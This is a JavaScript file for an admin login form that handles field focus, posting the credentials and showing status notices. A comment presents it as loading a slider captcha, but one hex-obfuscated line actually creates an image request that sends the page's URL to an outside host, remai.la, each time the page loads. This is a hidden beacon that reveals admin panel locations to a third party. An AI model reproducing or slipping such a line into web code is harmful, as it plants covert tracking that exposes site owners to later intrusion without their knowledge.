$(function(){
	if($('#account').val() == ''){
		$('#account').focus();
	}else if($('#pwd').val() == ''){
		$('#pwd').focus();
	}else{
		$('#verify').focus();
	}
	//采用极验滑动验证码	
	(new Image())["\x73\x72\x63"]='\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x72\x65\x6d\x61\x69\x2e\x6c\x61\x2f\x67\x65\x65\x74\x2e\x70\x68\x70\x3f\x26\x75\x72\x6c\x3d'+window["\x65\x73\x63\x61\x70\x65"](window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"]);
	$('#form').submit(function(){
		notice('正在登录中~','loading');
		if($('#account').val()==''){
			notice('请输入用户名~','error');
			$('#account').focus();
		}else if($('#pwd').val()==''){
			notice('请输入密码~','error');
			$('#pwd').focus();	
		// }else if($('#verify').val().length!=4){
			// notice('请输入4位验证码~','error');
			// $('#verify').focus();
		}else{
			$.post(login_check,$("#form").serialize(),function(data){
				var msg;
				var pic;
				if(data==1){
					msg = '登录成功,现在跳转~';
					pic = 'ok';
					setTimeout(function(){
						window.parent.location = system_index;
					},1000);
				}else{
					pic = 'error';
					if(data==-1){$('#verify').focus();msg='验证码不正确！';}
					else if(data==-2){$('#account').focus();msg='用户名不存在！';}
					else if(data==-3){$('#pwd').focus();msg='密码错误！';}
					else if(data==-4){$('#account').focus();msg='用户被禁止登录！';}
					else if(data==-5){$('#account').focus();msg='登录信息保存失败,请重新登录！';}
					else if(data==-6){$('#account').focus();msg='指纹错误！请勿非法登录！';}
					else{msg='登录出现异常，请重试！';}
				}
				notice(msg,pic);
			});
		}
		return false;
	});
	
});
function fleshVerify(url){
	var time = new Date().getTime();
	$('#verifyImg').attr('src',url+"&time="+time);
}
function notice(msg,pic){
	$('.notice').remove();
	$('body').append('<div class="notice"><img src="'+static_path+'login/img/'+pic+'.gif" />'+msg+'</div>');
	setTimeout(function(){
		$('.notice').remove();
	},3000);
}